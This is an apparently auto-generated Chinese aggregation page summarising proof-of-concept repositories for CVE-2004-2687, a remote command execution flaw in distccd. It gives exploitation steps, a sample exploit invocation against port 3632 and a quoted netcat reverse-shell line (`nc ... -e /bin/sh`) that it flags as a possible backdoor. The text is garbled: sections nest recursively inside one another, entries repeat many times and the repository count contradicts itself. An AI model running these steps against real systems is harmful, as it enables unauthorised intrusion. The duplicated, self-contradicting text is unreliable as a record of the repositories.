# CVE-2004-2687

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2004-2687-h3x0v3rl0rd_distccd_rce_CVE-2004-2687.md](../2004/CVE-2004-2687-h3x0v3rl0rd_distccd_rce_CVE-2004-2687.md)

## CVE-2004-2687-distccd-远程命令执行

**漏洞编号:** CVE-2004-2687

**漏洞类型:** 远程命令执行

**影响应用:** distccd

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** < 3.1

**利用条件:** 目标系统运行未受限制访问的 distccd 服务

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2004-2687 存在于 distccd 2.x 版本中。当 distccd 未配置为限制对服务器端口的访问时，远程攻击者可以通过编译任务执行任意命令。该漏洞的利用方式是向 distccd 服务发送特制的请求，其中包含要执行的命令。由于 distccd 在执行编译任务时没有进行适当的授权检查，因此可以执行攻击者提供的任意命令。

**有效性分析：**

根据漏洞信息、搜索结果以及提供的漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。漏洞库信息描述了该漏洞，搜索引擎结果中包含多个关于此漏洞的报告和分析，并且存在 Metasploit 模块。提供的 POC 代码 `distccd_rce.py` 实现了利用该漏洞执行任意命令的功能，其工作原理与漏洞描述相符，并且文档中包含了利用示例。

**投毒风险分析：**

分析提供的 `distccd_rce.py` 脚本，脚本本身实现了漏洞利用的功能。脚本从命令行参数接收目标主机、端口和要执行的命令，然后构造包含该命令的 payload 发送给目标 distccd 服务。脚本中没有发现明显的恶意代码，例如反弹 shell 到未知地址，或者删除系统文件等。但考虑到漏洞利用本身可以执行任意命令，如果攻击者修改了脚本并诱导用户使用，则可以植入恶意代码。代码本身是 Metasploit 移植过来的，相对安全,投毒风险很低。README.md中调用`nc [localhost] [lport] -e /bin/sh`,有后门嫌疑.

**利用方式：**

1.  **确定目标：** 找到运行 distccd 服务的系统，并且该服务未配置访问限制。
2.  **准备 exploit：** 准备 `distccd_rce.py` 脚本。
3.  **执行命令：** 使用脚本指定目标 IP 地址、端口和要执行的命令。例如，`python3 distccd_rce.py -t <target_ip> -p 3632 -c "id"` 将在目标系统上执行 `id` 命令。
4.  **获取结果：** 脚本会打印命令执行的结果。

由于 distccd 服务通常以较低权限运行，因此利用该漏洞获得的权限可能有限。但攻击者可以通过进一步的提权操作来获得更高的权限。


**项目地址:** [h3x0v3rl0rd/distccd_rce_CVE-2004-2687](https://github.com/h3x0v3rl0rd/distccd_rce_CVE-2004-2687)

**漏洞详情:** [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)

---

## POC #2

**来源**: [CVE-2004-2687-k4miyo_CVE-2004-2687.md](../2004/CVE-2004-2687-k4miyo_CVE-2004-2687.md)

# CVE-2004-2687

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2004-2687-h3x0v3rl0rd_distccd_rce_CVE-2004-2687.md](../2004/CVE-2004-2687-h3x0v3rl0rd_distccd_rce_CVE-2004-2687.md)

## CVE-2004-2687-distccd-远程命令执行

**漏洞编号:** CVE-2004-2687

**漏洞类型:** 远程命令执行

**影响应用:** distccd

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** < 3.1

**利用条件:** 目标系统运行未受限制访问的 distccd 服务

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2004-2687 存在于 distccd 2.x 版本中。当 distccd 未配置为限制对服务器端口的访问时，远程攻击者可以通过编译任务执行任意命令。该漏洞的利用方式是向 distccd 服务发送特制的请求，其中包含要执行的命令。由于 distccd 在执行编译任务时没有进行适当的授权检查，因此可以执行攻击者提供的任意命令。

**有效性分析：**

根据漏洞信息、搜索结果以及提供的漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。漏洞库信息描述了该漏洞，搜索引擎结果中包含多个关于此漏洞的报告和分析，并且存在 Metasploit 模块。提供的 POC 代码 `distccd_rce.py` 实现了利用该漏洞执行任意命令的功能，其工作原理与漏洞描述相符，并且文档中包含了利用示例。

**投毒风险分析：**

分析提供的 `distccd_rce.py` 脚本，脚本本身实现了漏洞利用的功能。脚本从命令行参数接收目标主机、端口和要执行的命令，然后构造包含该命令的 payload 发送给目标 distccd 服务。脚本中没有发现明显的恶意代码，例如反弹 shell 到未知地址，或者删除系统文件等。但考虑到漏洞利用本身可以执行任意命令，如果攻击者修改了脚本并诱导用户使用，则可以植入恶意代码。代码本身是 Metasploit 移植过来的，相对安全,投毒风险很低。README.md中调用`nc [localhost] [lport] -e /bin/sh`,有后门嫌疑.

**利用方式：**

1.  **确定目标：** 找到运行 distccd 服务的系统，并且该服务未配置访问限制。
2.  **准备 exploit：** 准备 `distccd_rce.py` 脚本。
3.  **执行命令：** 使用脚本指定目标 IP 地址、端口和要执行的命令。例如，`python3 distccd_rce.py -t <target_ip> -p 3632 -c "id"` 将在目标系统上执行 `id` 命令。
4.  **获取结果：** 脚本会打印命令执行的结果。

由于 distccd 服务通常以较低权限运行，因此利用该漏洞获得的权限可能有限。但攻击者可以通过进一步的提权操作来获得更高的权限。


**项目地址:** [h3x0v3rl0rd/distccd_rce_CVE-2004-2687](https://github.com/h3x0v3rl0rd/distccd_rce_CVE-2004-2687)

**漏洞详情:** [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)

---

## POC #2

**来源**: [CVE-2004-2687-k4miyo_CVE-2004-2687.md](../2004/CVE-2004-2687-k4miyo_CVE-2004-2687.md)

# CVE-2004-2687

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2004-2687-h3x0v3rl0rd_distccd_rce_CVE-2004-2687.md](../2004/CVE-2004-2687-h3x0v3rl0rd_distccd_rce_CVE-2004-2687.md)

## CVE-2004-2687-distccd-远程命令执行

**漏洞编号:** CVE-2004-2687

**漏洞类型:** 远程命令执行

**影响应用:** distccd

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** < 3.1

**利用条件:** 目标系统运行未受限制访问的 distccd 服务

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2004-2687 存在于 distccd 2.x 版本中。当 distccd 未配置为限制对服务器端口的访问时，远程攻击者可以通过编译任务执行任意命令。该漏洞的利用方式是向 distccd 服务发送特制的请求，其中包含要执行的命令。由于 distccd 在执行编译任务时没有进行适当的授权检查，因此可以执行攻击者提供的任意命令。

**有效性分析：**

根据漏洞信息、搜索结果以及提供的漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。漏洞库信息描述了该漏洞，搜索引擎结果中包含多个关于此漏洞的报告和分析，并且存在 Metasploit 模块。提供的 POC 代码 `distccd_rce.py` 实现了利用该漏洞执行任意命令的功能，其工作原理与漏洞描述相符，并且文档中包含了利用示例。

**投毒风险分析：**

分析提供的 `distccd_rce.py` 脚本，脚本本身实现了漏洞利用的功能。脚本从命令行参数接收目标主机、端口和要执行的命令，然后构造包含该命令的 payload 发送给目标 distccd 服务。脚本中没有发现明显的恶意代码，例如反弹 shell 到未知地址，或者删除系统文件等。但考虑到漏洞利用本身可以执行任意命令，如果攻击者修改了脚本并诱导用户使用，则可以植入恶意代码。代码本身是 Metasploit 移植过来的，相对安全,投毒风险很低。README.md中调用`nc [localhost] [lport] -e /bin/sh`,有后门嫌疑.

**利用方式：**

1.  **确定目标：** 找到运行 distccd 服务的系统，并且该服务未配置访问限制。
2.  **准备 exploit：** 准备 `distccd_rce.py` 脚本。
3.  **执行命令：** 使用脚本指定目标 IP 地址、端口和要执行的命令。例如，`python3 distccd_rce.py -t <target_ip> -p 3632 -c "id"` 将在目标系统上执行 `id` 命令。
4.  **获取结果：** 脚本会打印命令执行的结果。

由于 distccd 服务通常以较低权限运行，因此利用该漏洞获得的权限可能有限。但攻击者可以通过进一步的提权操作来获得更高的权限。


**项目地址:** [h3x0v3rl0rd/distccd_rce_CVE-2004-2687](https://github.com/h3x0v3rl0rd/distccd_rce_CVE-2004-2687)

**漏洞详情:** [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)

---

## POC #2

**来源**: [CVE-2004-2687-k4miyo_CVE-2004-2687.md](../2004/CVE-2004-2687-k4miyo_CVE-2004-2687.md)

# CVE-2004-2687

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2004-2687-h3x0v3rl0rd_distccd_rce_CVE-2004-2687.md](../2004/CVE-2004-2687-h3x0v3rl0rd_distccd_rce_CVE-2004-2687.md)

## CVE-2004-2687-distccd-远程命令执行

**漏洞编号:** CVE-2004-2687

**漏洞类型:** 远程命令执行

**影响应用:** distccd

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** < 3.1

**利用条件:** 目标系统运行未受限制访问的 distccd 服务

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2004-2687 存在于 distccd 2.x 版本中。当 distccd 未配置为限制对服务器端口的访问时，远程攻击者可以通过编译任务执行任意命令。该漏洞的利用方式是向 distccd 服务发送特制的请求，其中包含要执行的命令。由于 distccd 在执行编译任务时没有进行适当的授权检查，因此可以执行攻击者提供的任意命令。

**有效性分析：**

根据漏洞信息、搜索结果以及提供的漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。漏洞库信息描述了该漏洞，搜索引擎结果中包含多个关于此漏洞的报告和分析，并且存在 Metasploit 模块。提供的 POC 代码 `distccd_rce.py` 实现了利用该漏洞执行任意命令的功能，其工作原理与漏洞描述相符，并且文档中包含了利用示例。

**投毒风险分析：**

分析提供的 `distccd_rce.py` 脚本，脚本本身实现了漏洞利用的功能。脚本从命令行参数接收目标主机、端口和要执行的命令，然后构造包含该命令的 payload 发送给目标 distccd 服务。脚本中没有发现明显的恶意代码，例如反弹 shell 到未知地址，或者删除系统文件等。但考虑到漏洞利用本身可以执行任意命令，如果攻击者修改了脚本并诱导用户使用，则可以植入恶意代码。代码本身是 Metasploit 移植过来的，相对安全,投毒风险很低。README.md中调用`nc [localhost] [lport] -e /bin/sh`,有后门嫌疑.

**利用方式：**

1.  **确定目标：** 找到运行 distccd 服务的系统，并且该服务未配置访问限制。
2.  **准备 exploit：** 准备 `distccd_rce.py` 脚本。
3.  **执行命令：** 使用脚本指定目标 IP 地址、端口和要执行的命令。例如，`python3 distccd_rce.py -t <target_ip> -p 3632 -c "id"` 将在目标系统上执行 `id` 命令。
4.  **获取结果：** 脚本会打印命令执行的结果。

由于 distccd 服务通常以较低权限运行，因此利用该漏洞获得的权限可能有限。但攻击者可以通过进一步的提权操作来获得更高的权限。


**项目地址:** [h3x0v3rl0rd/distccd_rce_CVE-2004-2687](https://github.com/h3x0v3rl0rd/distccd_rce_CVE-2004-2687)

**漏洞详情:** [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)

---

## POC #2

**来源**: [CVE-2004-2687-k4miyo_CVE-2004-2687.md](../2004/CVE-2004-2687-k4miyo_CVE-2004-2687.md)

# CVE-2004-2687

> 📦 该CVE有 **2** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2004-2687-h3x0v3rl0rd_distccd_rce_CVE-2004-2687.md](../2004/CVE-2004-2687-h3x0v3rl0rd_distccd_rce_CVE-2004-2687.md)

## CVE-2004-2687-distccd-远程命令执行

**漏洞编号:** CVE-2004-2687

**漏洞类型:** 远程命令执行

**影响应用:** distccd

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** < 3.1

**利用条件:** 目标系统运行未受限制访问的 distccd 服务

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2004-2687 存在于 distccd 2.x 版本中。当 distccd 未配置为限制对服务器端口的访问时，远程攻击者可以通过编译任务执行任意命令。该漏洞的利用方式是向 distccd 服务发送特制的请求，其中包含要执行的命令。由于 distccd 在执行编译任务时没有进行适当的授权检查，因此可以执行攻击者提供的任意命令。

**有效性分析：**

根据漏洞信息、搜索结果以及提供的漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。漏洞库信息描述了该漏洞，搜索引擎结果中包含多个关于此漏洞的报告和分析，并且存在 Metasploit 模块。提供的 POC 代码 `distccd_rce.py` 实现了利用该漏洞执行任意命令的功能，其工作原理与漏洞描述相符，并且文档中包含了利用示例。

**投毒风险分析：**

分析提供的 `distccd_rce.py` 脚本，脚本本身实现了漏洞利用的功能。脚本从命令行参数接收目标主机、端口和要执行的命令，然后构造包含该命令的 payload 发送给目标 distccd 服务。脚本中没有发现明显的恶意代码，例如反弹 shell 到未知地址，或者删除系统文件等。但考虑到漏洞利用本身可以执行任意命令，如果攻击者修改了脚本并诱导用户使用，则可以植入恶意代码。代码本身是 Metasploit 移植过来的，相对安全,投毒风险很低。README.md中调用`nc [localhost] [lport] -e /bin/sh`,有后门嫌疑.

**利用方式：**

1.  **确定目标：** 找到运行 distccd 服务的系统，并且该服务未配置访问限制。
2.  **准备 exploit：** 准备 `distccd_rce.py` 脚本。
3.  **执行命令：** 使用脚本指定目标 IP 地址、端口和要执行的命令。例如，`python3 distccd_rce.py -t <target_ip> -p 3632 -c "id"` 将在目标系统上执行 `id` 命令。
4.  **获取结果：** 脚本会打印命令执行的结果。

由于 distccd 服务通常以较低权限运行，因此利用该漏洞获得的权限可能有限。但攻击者可以通过进一步的提权操作来获得更高的权限。


**项目地址:** [h3x0v3rl0rd/distccd_rce_CVE-2004-2687](https://github.com/h3x0v3rl0rd/distccd_rce_CVE-2004-2687)

**漏洞详情:** [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)

---

## POC #2

**来源**: [CVE-2004-2687-ss0wl_CVE-2004-2687_distcc_v1.md](../2004/CVE-2004-2687-ss0wl_CVE-2004-2687_distcc_v1.md)

## CVE-2004-2687-distcc-远程代码执行

**漏洞编号:** CVE-2004-2687

**漏洞类型:** 远程代码执行

**影响应用:** distcc

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.x (未配置访问限制)

**利用条件:** 目标系统运行未配置访问限制的distcc服务，网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2004-2687 漏洞存在于 distcc 2.x 版本中，当 distcc 未配置为限制对服务器端口的访问时，远程攻击者可以通过编译任务执行任意命令。这些编译任务由服务器在没有授权检查的情况下执行。

**有效性分析：**

提供的 exploit.py 脚本尝试利用此漏洞。它通过创建 socket 连接到目标 distcc 服务器，然后构造一个包含恶意命令的 '编译任务' 请求发送给服务器。如果服务器没有进行适当的访问限制，就会执行该命令。

**投毒风险分析：**

代码主要功能是构造恶意请求并发送，没有发现明显的恶意代码。虽然`rand_text_alphanumeric`函数可能被滥用，但当前代码中只是为了生成一个随机tag，没有被用于执行恶意操作。`requirements.txt`文件声明了依赖`argparse`，没有添加其他可疑的依赖。

代码存在潜在投毒的微小风险：
1.  **`rand_text_alphanumeric`函数：**虽然目前用于生成随机字符串，理论上可以修改该函数植入后门，但现有代码没有这个现象。这种潜在的风险极低，但并非完全不存在。
2.  **依赖项风险：**虽然`argparse`是标准库，但如果作者发布到PyPI，理论上存在供应链投毒风险，但这里是从可信来源获取的，风险极低。 
3. **后门执行风险**：漏洞利用成功后，攻击者可以利用此漏洞在目标系统上执行任意命令，这本身就是一种“后门”植入。但这不是作者投毒代码，而是漏洞本身导致的。

因此，综合评估投毒风险较低，大约为10%。 主要风险来源于利用漏洞成功后，执行的命令可能包含恶意后门。

**利用方式：**

1.  **确定目标distcc服务器。** 通过端口扫描等方式找到运行 distcc 服务的机器，端口通常为 3632。
2.  **检查distcc配置。** 确认目标 distcc 服务器是否配置了访问限制。如果没有，则漏洞存在。
3.  **运行漏洞利用代码。** 使用提供的 exploit.py 脚本，指定目标 IP 地址和端口。
4.  **输入要执行的命令。** 脚本会提示输入要执行的命令。输入命令后，脚本会将其嵌入到 distcc 编译任务请求中，并发送给服务器。
5.  **服务器执行命令。** 如果漏洞利用成功，服务器将以 distcc 服务的权限执行命令，并将结果返回给攻击者。

**安全建议：**

*   配置 distcc 以限制对可信客户端的访问。使用防火墙或其他访问控制机制，只允许授权的机器连接 distcc 服务器。
*   升级 distcc 到最新版本，或者移除 distcc。

**项目地址:** [ss0wl/CVE-2004-2687_distcc_v1](https://github.com/ss0wl/CVE-2004-2687_distcc_v1)

**漏洞详情:** [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)

---



---

## POC #3

**来源**: [CVE-2004-2687-ss0wl_CVE-2004-2687_distcc_v1.md](../2004/CVE-2004-2687-ss0wl_CVE-2004-2687_distcc_v1.md)

## CVE-2004-2687-distcc-远程代码执行

**漏洞编号:** CVE-2004-2687

**漏洞类型:** 远程代码执行

**影响应用:** distcc

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.x (未配置访问限制)

**利用条件:** 目标系统运行未配置访问限制的distcc服务，网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2004-2687 漏洞存在于 distcc 2.x 版本中，当 distcc 未配置为限制对服务器端口的访问时，远程攻击者可以通过编译任务执行任意命令。这些编译任务由服务器在没有授权检查的情况下执行。

**有效性分析：**

提供的 exploit.py 脚本尝试利用此漏洞。它通过创建 socket 连接到目标 distcc 服务器，然后构造一个包含恶意命令的 '编译任务' 请求发送给服务器。如果服务器没有进行适当的访问限制，就会执行该命令。

**投毒风险分析：**

代码主要功能是构造恶意请求并发送，没有发现明显的恶意代码。虽然`rand_text_alphanumeric`函数可能被滥用，但当前代码中只是为了生成一个随机tag，没有被用于执行恶意操作。`requirements.txt`文件声明了依赖`argparse`，没有添加其他可疑的依赖。

代码存在潜在投毒的微小风险：
1.  **`rand_text_alphanumeric`函数：**虽然目前用于生成随机字符串，理论上可以修改该函数植入后门，但现有代码没有这个现象。这种潜在的风险极低，但并非完全不存在。
2.  **依赖项风险：**虽然`argparse`是标准库，但如果作者发布到PyPI，理论上存在供应链投毒风险，但这里是从可信来源获取的，风险极低。 
3. **后门执行风险**：漏洞利用成功后，攻击者可以利用此漏洞在目标系统上执行任意命令，这本身就是一种“后门”植入。但这不是作者投毒代码，而是漏洞本身导致的。

因此，综合评估投毒风险较低，大约为10%。 主要风险来源于利用漏洞成功后，执行的命令可能包含恶意后门。

**利用方式：**

1.  **确定目标distcc服务器。** 通过端口扫描等方式找到运行 distcc 服务的机器，端口通常为 3632。
2.  **检查distcc配置。** 确认目标 distcc 服务器是否配置了访问限制。如果没有，则漏洞存在。
3.  **运行漏洞利用代码。** 使用提供的 exploit.py 脚本，指定目标 IP 地址和端口。
4.  **输入要执行的命令。** 脚本会提示输入要执行的命令。输入命令后，脚本会将其嵌入到 distcc 编译任务请求中，并发送给服务器。
5.  **服务器执行命令。** 如果漏洞利用成功，服务器将以 distcc 服务的权限执行命令，并将结果返回给攻击者。

**安全建议：**

*   配置 distcc 以限制对可信客户端的访问。使用防火墙或其他访问控制机制，只允许授权的机器连接 distcc 服务器。
*   升级 distcc 到最新版本，或者移除 distcc。

**项目地址:** [ss0wl/CVE-2004-2687_distcc_v1](https://github.com/ss0wl/CVE-2004-2687_distcc_v1)

**漏洞详情:** [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)

---



---

## POC #3

**来源**: [CVE-2004-2687-ss0wl_CVE-2004-2687_distcc_v1.md](../2004/CVE-2004-2687-ss0wl_CVE-2004-2687_distcc_v1.md)

## CVE-2004-2687-distcc-远程代码执行

**漏洞编号:** CVE-2004-2687

**漏洞类型:** 远程代码执行

**影响应用:** distcc

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.x (未配置访问限制)

**利用条件:** 目标系统运行未配置访问限制的distcc服务，网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2004-2687 漏洞存在于 distcc 2.x 版本中，当 distcc 未配置为限制对服务器端口的访问时，远程攻击者可以通过编译任务执行任意命令。这些编译任务由服务器在没有授权检查的情况下执行。

**有效性分析：**

提供的 exploit.py 脚本尝试利用此漏洞。它通过创建 socket 连接到目标 distcc 服务器，然后构造一个包含恶意命令的 '编译任务' 请求发送给服务器。如果服务器没有进行适当的访问限制，就会执行该命令。

**投毒风险分析：**

代码主要功能是构造恶意请求并发送，没有发现明显的恶意代码。虽然`rand_text_alphanumeric`函数可能被滥用，但当前代码中只是为了生成一个随机tag，没有被用于执行恶意操作。`requirements.txt`文件声明了依赖`argparse`，没有添加其他可疑的依赖。

代码存在潜在投毒的微小风险：
1.  **`rand_text_alphanumeric`函数：**虽然目前用于生成随机字符串，理论上可以修改该函数植入后门，但现有代码没有这个现象。这种潜在的风险极低，但并非完全不存在。
2.  **依赖项风险：**虽然`argparse`是标准库，但如果作者发布到PyPI，理论上存在供应链投毒风险，但这里是从可信来源获取的，风险极低。 
3. **后门执行风险**：漏洞利用成功后，攻击者可以利用此漏洞在目标系统上执行任意命令，这本身就是一种“后门”植入。但这不是作者投毒代码，而是漏洞本身导致的。

因此，综合评估投毒风险较低，大约为10%。 主要风险来源于利用漏洞成功后，执行的命令可能包含恶意后门。

**利用方式：**

1.  **确定目标distcc服务器。** 通过端口扫描等方式找到运行 distcc 服务的机器，端口通常为 3632。
2.  **检查distcc配置。** 确认目标 distcc 服务器是否配置了访问限制。如果没有，则漏洞存在。
3.  **运行漏洞利用代码。** 使用提供的 exploit.py 脚本，指定目标 IP 地址和端口。
4.  **输入要执行的命令。** 脚本会提示输入要执行的命令。输入命令后，脚本会将其嵌入到 distcc 编译任务请求中，并发送给服务器。
5.  **服务器执行命令。** 如果漏洞利用成功，服务器将以 distcc 服务的权限执行命令，并将结果返回给攻击者。

**安全建议：**

*   配置 distcc 以限制对可信客户端的访问。使用防火墙或其他访问控制机制，只允许授权的机器连接 distcc 服务器。
*   升级 distcc 到最新版本，或者移除 distcc。

**项目地址:** [ss0wl/CVE-2004-2687_distcc_v1](https://github.com/ss0wl/CVE-2004-2687_distcc_v1)

**漏洞详情:** [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)

---



---

## POC #3

**来源**: [CVE-2004-2687-ss0wl_CVE-2004-2687_distcc_v1.md](../2004/CVE-2004-2687-ss0wl_CVE-2004-2687_distcc_v1.md)

## CVE-2004-2687-distcc-远程代码执行

**漏洞编号:** CVE-2004-2687

**漏洞类型:** 远程代码执行

**影响应用:** distcc

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.x (未配置访问限制)

**利用条件:** 目标系统运行未配置访问限制的distcc服务，网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2004-2687 漏洞存在于 distcc 2.x 版本中，当 distcc 未配置为限制对服务器端口的访问时，远程攻击者可以通过编译任务执行任意命令。这些编译任务由服务器在没有授权检查的情况下执行。

**有效性分析：**

提供的 exploit.py 脚本尝试利用此漏洞。它通过创建 socket 连接到目标 distcc 服务器，然后构造一个包含恶意命令的 '编译任务' 请求发送给服务器。如果服务器没有进行适当的访问限制，就会执行该命令。

**投毒风险分析：**

代码主要功能是构造恶意请求并发送，没有发现明显的恶意代码。虽然`rand_text_alphanumeric`函数可能被滥用，但当前代码中只是为了生成一个随机tag，没有被用于执行恶意操作。`requirements.txt`文件声明了依赖`argparse`，没有添加其他可疑的依赖。

代码存在潜在投毒的微小风险：
1.  **`rand_text_alphanumeric`函数：**虽然目前用于生成随机字符串，理论上可以修改该函数植入后门，但现有代码没有这个现象。这种潜在的风险极低，但并非完全不存在。
2.  **依赖项风险：**虽然`argparse`是标准库，但如果作者发布到PyPI，理论上存在供应链投毒风险，但这里是从可信来源获取的，风险极低。 
3. **后门执行风险**：漏洞利用成功后，攻击者可以利用此漏洞在目标系统上执行任意命令，这本身就是一种“后门”植入。但这不是作者投毒代码，而是漏洞本身导致的。

因此，综合评估投毒风险较低，大约为10%。 主要风险来源于利用漏洞成功后，执行的命令可能包含恶意后门。

**利用方式：**

1.  **确定目标distcc服务器。** 通过端口扫描等方式找到运行 distcc 服务的机器，端口通常为 3632。
2.  **检查distcc配置。** 确认目标 distcc 服务器是否配置了访问限制。如果没有，则漏洞存在。
3.  **运行漏洞利用代码。** 使用提供的 exploit.py 脚本，指定目标 IP 地址和端口。
4.  **输入要执行的命令。** 脚本会提示输入要执行的命令。输入命令后，脚本会将其嵌入到 distcc 编译任务请求中，并发送给服务器。
5.  **服务器执行命令。** 如果漏洞利用成功，服务器将以 distcc 服务的权限执行命令，并将结果返回给攻击者。

**安全建议：**

*   配置 distcc 以限制对可信客户端的访问。使用防火墙或其他访问控制机制，只允许授权的机器连接 distcc 服务器。
*   升级 distcc 到最新版本，或者移除 distcc。

**项目地址:** [ss0wl/CVE-2004-2687_distcc_v1](https://github.com/ss0wl/CVE-2004-2687_distcc_v1)

**漏洞详情:** [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)

---



---

## POC #3

**来源**: [CVE-2004-2687-ss0wl_CVE-2004-2687_distcc_v1.md](../2004/CVE-2004-2687-ss0wl_CVE-2004-2687_distcc_v1.md)

## CVE-2004-2687-distcc-远程代码执行

**漏洞编号:** CVE-2004-2687

**漏洞类型:** 远程代码执行

**影响应用:** distcc

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.x (未配置访问限制)

**利用条件:** 目标系统运行未配置访问限制的distcc服务，网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2004-2687 漏洞存在于 distcc 2.x 版本中，当 distcc 未配置为限制对服务器端口的访问时，远程攻击者可以通过编译任务执行任意命令。这些编译任务由服务器在没有授权检查的情况下执行。

**有效性分析：**

提供的 exploit.py 脚本尝试利用此漏洞。它通过创建 socket 连接到目标 distcc 服务器，然后构造一个包含恶意命令的 '编译任务' 请求发送给服务器。如果服务器没有进行适当的访问限制，就会执行该命令。

**投毒风险分析：**

代码主要功能是构造恶意请求并发送，没有发现明显的恶意代码。虽然`rand_text_alphanumeric`函数可能被滥用，但当前代码中只是为了生成一个随机tag，没有被用于执行恶意操作。`requirements.txt`文件声明了依赖`argparse`，没有添加其他可疑的依赖。

代码存在潜在投毒的微小风险：
1.  **`rand_text_alphanumeric`函数：**虽然目前用于生成随机字符串，理论上可以修改该函数植入后门，但现有代码没有这个现象。这种潜在的风险极低，但并非完全不存在。
2.  **依赖项风险：**虽然`argparse`是标准库，但如果作者发布到PyPI，理论上存在供应链投毒风险，但这里是从可信来源获取的，风险极低。 
3. **后门执行风险**：漏洞利用成功后，攻击者可以利用此漏洞在目标系统上执行任意命令，这本身就是一种“后门”植入。但这不是作者投毒代码，而是漏洞本身导致的。

因此，综合评估投毒风险较低，大约为10%。 主要风险来源于利用漏洞成功后，执行的命令可能包含恶意后门。

**利用方式：**

1.  **确定目标distcc服务器。** 通过端口扫描等方式找到运行 distcc 服务的机器，端口通常为 3632。
2.  **检查distcc配置。** 确认目标 distcc 服务器是否配置了访问限制。如果没有，则漏洞存在。
3.  **运行漏洞利用代码。** 使用提供的 exploit.py 脚本，指定目标 IP 地址和端口。
4.  **输入要执行的命令。** 脚本会提示输入要执行的命令。输入命令后，脚本会将其嵌入到 distcc 编译任务请求中，并发送给服务器。
5.  **服务器执行命令。** 如果漏洞利用成功，服务器将以 distcc 服务的权限执行命令，并将结果返回给攻击者。

**安全建议：**

*   配置 distcc 以限制对可信客户端的访问。使用防火墙或其他访问控制机制，只允许授权的机器连接 distcc 服务器。
*   升级 distcc 到最新版本，或者移除 distcc。

**项目地址:** [ss0wl/CVE-2004-2687_distcc_v1](https://github.com/ss0wl/CVE-2004-2687_distcc_v1)

**漏洞详情:** [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)

---

